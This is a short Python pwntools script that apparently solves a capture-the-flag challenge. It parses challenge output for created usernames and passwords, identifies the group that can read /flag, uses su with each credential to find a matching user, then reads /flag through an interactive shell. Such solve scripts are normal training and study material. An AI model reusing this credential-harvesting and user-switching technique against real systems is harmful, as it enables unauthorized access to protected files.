#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

io = process("/challenge/run")

data = io.recvall()

l = data.split(b'/flag\n')[1].split(b'After')[0].split(b'\n')[:-1]

io.close()

def finder():
    for li in l:
        username = li.decode().split('Created user ')[1].split(' with password ')[0].strip()
        password = li.decode().split('Created user ')[1].split(' with password ')[1].strip()
        group = data.decode().split('After:\n----r----- 1 root ')[1].split(' 60')[0].strip()
        io = process(['su',username])
        io.sendline(password.encode())
        io.sendline(b'groups')
        d = io.recvline()
        if group in d.decode():
            io.close()
            return (username,password)
        io.close()
username,password = finder()
io = process(['su',username])
io.sendline(password.encode())

io.sendline(b'cat /flag')

io.interactive()
